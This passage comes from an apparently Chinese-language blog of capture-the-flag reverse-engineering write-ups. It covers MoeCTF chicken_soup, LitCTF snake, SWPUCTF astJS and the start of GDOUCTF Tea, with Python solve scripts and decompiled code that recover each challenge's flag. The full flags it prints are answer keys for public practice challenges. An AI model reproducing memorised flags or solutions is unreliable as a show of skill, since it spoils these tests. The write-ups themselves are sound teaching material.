punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">171</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">152</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">152</span><span class="token punctuation">,</span> <span class="token number">144</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">171</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">158</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">]</span>      <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">33</span> <span class="token operator">%</span> b <span class="token operator">!=</span> c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"wrong"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">None</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"win"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="exp-27"><a class="markdownIt-Anchor" href="#exp-27"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">c <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token number">144</span><span class="token punctuation">,</span> <span class="token number">163</span><span class="token punctuation">,</span> <span class="token number">158</span><span class="token punctuation">,</span> <span class="token number">177</span><span class="token punctuation">,</span> <span class="token number">121</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">158</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">152</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">171</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">171</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">152</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">152</span><span class="token punctuation">,</span> <span class="token number">144</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">171</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">158</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">]</span>a<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>b<span class="token operator">=</span><span class="token number">2</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> j<span class="token operator">*</span><span class="token number">33</span><span class="token operator">%</span>b <span class="token operator">==</span> c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>                a<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'flag'</span> <span class="token keyword">in</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#flag&#123;2889e7a3-0d6b-4cbb-b6e9-04c0f26c9dca&#125;</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>b<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>   <span class="token comment">#179</span>    b<span class="token operator">+=</span><span class="token number">1</span>    a<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="moectf-2022chicken_soup"><a class="markdownIt-Anchor" href="#moectf-2022chicken_soup"></a> [MoeCTF 2022]chicken_soup</h2><h3 id="题目描述-29"><a class="markdownIt-Anchor" href="#题目描述-29"></a> 题目描述</h3><p>首先进入查壳，在进入到IDA<br />发现有两个加密函数<br /><img src="https://www.nssctf.cn/files/2024/1/2/aee41130c3.jpg" alt="NSSIMAGE" / loading="lazy"><br />进去看一看<br />发现互补跳转的花指令<br /><img src="https://www.nssctf.cn/files/2024/1/2/7e6688c8ac.jpg" alt="NSSIMAGE" / loading="lazy"><br />接着手动修改花指令，根据跳转的字节大小（为一个字节），外面将跳转后面的一个字节nop(修改为90)掉就ok了<br /><img src="https://www.nssctf.cn/files/2024/1/2/329faa6d6d.jpg" alt="NSSIMAGE" / loading="lazy"><br />按p定义函数后按F5就可以看到源代码了：<br /><img src="https://www.nssctf.cn/files/2024/1/2/f298e57cbd.jpg" alt="NSSIMAGE" / loading="lazy"><br />另一个加密函数同样的方法操作。<br />接着后面有一个函数点进去看，发现是比较字符串的函数，在内存中找到加密后的密文，注意长度为38.<br /><img src="https://www.nssctf.cn/files/2024/1/2/09a60445a8.jpg" alt="NSSIMAGE" / loading="lazy"><br />拿出来用脚本反向解密拿到flag。</p><h3 id="exp-28"><a class="markdownIt-Anchor" href="#exp-28"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">Array<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">205</span><span class="token punctuation">,</span>  <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">140</span><span class="token punctuation">,</span> <span class="token number">125</span><span class="token punctuation">,</span> <span class="token number">173</span><span class="token punctuation">,</span>  <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">190</span><span class="token punctuation">,</span>  <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">138</span><span class="token punctuation">,</span> <span class="token number">125</span><span class="token punctuation">,</span>   <span class="token number">188</span><span class="token punctuation">,</span> <span class="token number">124</span><span class="token punctuation">,</span> <span class="token number">252</span><span class="token punctuation">,</span>  <span class="token number">46</span><span class="token punctuation">,</span>  <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">121</span><span class="token punctuation">,</span> <span class="token number">157</span><span class="token punctuation">,</span> <span class="token number">106</span><span class="token punctuation">,</span>  <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">204</span><span class="token punctuation">,</span>    <span class="token number">61</span><span class="token punctuation">,</span>  <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">248</span><span class="token punctuation">,</span>  <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">121</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span>  <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">217</span><span class="token punctuation">,</span> <span class="token number">221</span><span class="token punctuation">,</span> <span class="token number">157</span><span class="token punctuation">,</span>   <span class="token number">169</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span>  <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">140</span><span class="token punctuation">,</span> <span class="token number">221</span><span class="token punctuation">,</span>  <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">233</span><span class="token punctuation">,</span> <span class="token number">215</span><span class="token punctuation">]</span><span class="token triple-quoted-string string">'''正向过程第一个函数:flag2[i]=flag[i]+flag[i+1]第二个函数:Array[i]=(16*flag2[i])|flag2[i]>>4  前四位后四位互换'''</span>flag2<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> Array<span class="token punctuation">:</span>    flag2<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token operator">&amp;</span><span class="token number">0xf0</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token operator">&amp;</span><span class="token number">0xf</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>Array<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>flag2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span>flag2<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span>flag2<span class="token operator">=</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> flag2<span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>flag2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#moectf&#123;p4tch_pr0gr4m_t0_d3c0mpi1e_it!&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="litctf-2023snakepyc文件头修复"><a class="markdownIt-Anchor" href="#litctf-2023snakepyc文件头修复"></a> [LitCTF 2023]snake（pyc文件头修复）</h2><h3 id="题目描述-30"><a class="markdownIt-Anchor" href="#题目描述-30"></a> 题目描述</h3><p>直接反编译发现magic number不对</p><p>python 3.7生成的 pyc 文件前32个字节</p><p>42 0D 0D 0A<br />所以拖进010editor修改前4个字节保存再反编译<br />然后把代码中flag附近的拖出来，转成字符串输出</p><p><a href="https://blog.csdn.net/Zheng__Huang/article/details/112380221">MagicNumber详解</a></p><p>扒出源码后直接运行出flag的代码</p><h3 id="exp-29"><a class="markdownIt-Anchor" href="#exp-29"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">flag <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">196</span><span class="token punctuation">,</span>        <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">252</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">220</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">243</span><span class="token punctuation">,</span>        <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">241</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">224</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">230</span><span class="token punctuation">,</span>        <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">251</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">233</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">237</span><span class="token punctuation">,</span>        <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">225</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">215</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">231</span><span class="token punctuation">,</span>        <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">237</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">251</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">169</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">,</span>flag<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> flag<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">136</span><span class="token punctuation">,</span>flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">119</span>flag<span class="token operator">=</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#LitCTF&#123;python_snake_is_so_easy!&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个题有个很坑的地方，pycdc反编译好有错误，flag[i] = flag[i + 1] ^ 136 flag[i + 1] = flag[i] ^ 119</p><p>uncompyle6才能正确反编译成功flag[i] ,flag[i + 1] = flag[i + 1] ^ 136,flag[i] ^ 119</p><p>遇到坑的时候可以两个引擎都试试对照一下</p><h2 id="swpuctf-2021-新生赛astjsjs逆向"><a class="markdownIt-Anchor" href="#swpuctf-2021-新生赛astjsjs逆向"></a> [SWPUCTF 2021 新生赛]astJS(js逆向)</h2><h3 id="题目描述-31"><a class="markdownIt-Anchor" href="#题目描述-31"></a> 题目描述</h3><p>使用 npm 包 <code>escodegen</code> 解密</p><ol><li>安装 escodegen</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> i escodegen <span class="token parameter variable">-g</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ esgenerate 附件.json<span class="token punctuation">(</span><span class="token function-name function">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> bE<span class="token punctuation">(</span>str, key<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        var arr <span class="token operator">=</span> str.split<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token builtin class-name">return</span> arr.map<span class="token punctuation">(</span>i <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>            <span class="token builtin class-name">return</span> String.fromCharCode<span class="token punctuation">(</span>i.charCodeAt<span class="token punctuation">(</span><span class="token punctuation">)</span> ^ key<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>.join<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    console.log<span class="token punctuation">(</span>bE<span class="token punctuation">(</span><span class="token string">'EXXH_Mpjx\x7FBxYnjggrM~eerv'</span>, <span class="token number">11</span><span class="token punctuation">))</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行语句即可获得 flag</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">node</span>Welcome to Node.js v14.13.1.Type <span class="token string">".help"</span> <span class="token keyword">for</span> <span class="token function">more</span> information.<span class="token operator">></span> <span class="token punctuation">(</span><span class="token function-name function">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">..</span>.     <span class="token keyword">function</span> bE<span class="token punctuation">(</span>str, key<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.         var arr <span class="token operator">=</span> str.split<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.         <span class="token builtin class-name">return</span> arr.map<span class="token punctuation">(</span>i <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">&#123;</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.             <span class="token builtin class-name">return</span> String.fromCharCode<span class="token punctuation">(</span>i.charCodeAt<span class="token punctuation">(</span><span class="token punctuation">)</span> ^ key<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.         <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>.join<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.     <span class="token punctuation">&#125;</span><span class="token punctuation">..</span>.     console.log<span class="token punctuation">(</span>bE<span class="token punctuation">(</span><span class="token string">'EXXH_Mpjx\x7FBxYnjggrM~eerv'</span>, <span class="token number">11</span><span class="token punctuation">))</span><span class="token punctuation">;</span><span class="token punctuation">..</span>. <span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>NSSCTF<span class="token punctuation">&#123;</span>astIsReallyFunny<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="gdouctf-2023tea"><a class="markdownIt-Anchor" href="#gdouctf-2023tea"></a> [GDOUCTF 2023]Tea</h2><h3 id="题目描述-32"><a class="markdownIt-Anchor" href="#题目描述-32"></a> 题目描述</h3><p>题目已经告诉我们这个是一个tea加密</p><p>查壳，无壳，打开ida找flag，交叉引用到主函数</p><h4 id="ida分析"><a class="markdownIt-Anchor" href="#ida分析"></a> IDA分析:</h4><p>通过字符串窗口，我们可以找到字符串&quot;you are right!\n&quot;.交叉引用(X键)到相关函数去.</p><p>字符串所在函数代码:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">sub_140016230</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>v0<span class="token punctuation">;</span> <span class="token comment">// rdi</span>  __int64 i<span class="token punctuation">;</span> <span class="token comment">// rcx</span>  <span class="token keyword">char</span> v3<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-20h] BYREF</span>  <span class="token keyword">char</span> v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp+0h] BYREF</span>  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+24h] [rbp+4h]</span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+44h] [rbp+24h]</span>  <span class="token keyword">int</span> v7<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+68h] [rbp+48h] BYREF</span>  _DWORD v8<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+98h] [rbp+78h] BYREF</span>  <span class="token keyword">int</span> v9<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+D8h] [rbp+B8h] BYREF</span>  <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment">// [rsp+154h] [rbp+134h]</span>  <span class="token keyword">int</span> k<span class="token punctuation">;</span> <span class="token comment">// [rsp+174h] [rbp+154h]</span>  <span class="token keyword">int</span> m<span class="token punctuation">;</span> <span class="token comment">// [rsp+194h] [rbp+174h]</span>  v0 <span class="token operator">=</span> <span class="token operator">&amp;</span>v4<span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">102</span>i64<span class="token punctuation">;</span> i<span class="token punctuation">;</span> <span class="token operator">--</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v0 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">858993460</span><span class="token punctuation">;</span>    v0 <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">sub_14001137F</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_140023009<span class="token punctuation">)</span><span class="token punctuation">;</span>  v5 <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span>  v6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v7<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1234</span><span class="token punctuation">;</span>  v7<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">5678</span><span class="token punctuation">;</span>  v7<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9012</span><span class="token punctuation">;</span>  v7<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3456</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>v8<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x28u</span>i64<span class="token punctuation">)</span><span class="token punctuation">;</span>  v9<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v9<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">sub_1400113E8</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>    <span class="token function">sub_1400111FE</span><span class="token punctuation">(</span><span class="token string">"%x"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v8<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_140011339</span><span class="token punctuation">(</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_140011145</span><span class="token punctuation">(</span>v8<span class="token punctuation">,</span> v9<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_1400112B7</span><span class="token punctuation">(</span>v8<span class="token punctuation">,</span> v7<span class="token punctuation">)</span><span class="token punctuation">;</span>  v6 <span class="token operator">=</span> <span class="token function">sub_140011352</span><span class="token punctuation">(</span>v8<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">sub_140011195</span><span class="token punctuation">(</span><span class="token string">"you are right\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token operator">++</span>k <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span> m <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span> m <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>m <span class="token punctuation">)</span>        <span class="token function">sub_140011195</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v9<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">*</span> m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    <span class="token function">sub_140011195</span><span class="token punctuation">(</span><span class="token string">"fault!\nYou can go online and learn the tea algorithm!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">sub_140011311</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> <span class="token operator">&amp;</span>unk_14001AE90<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span>i64<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="sub_1400113e8函数"><a class="markdownIt-Anchor" href="#sub_1400113e8函数"></a> sub_1400113E8函数</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">sub_1400113E8</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token function">sub_140011B00</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">sub_140011B00</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">sub_14001137F</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_140023009<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This is the input format for you geting of flag hex \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"0x12345678 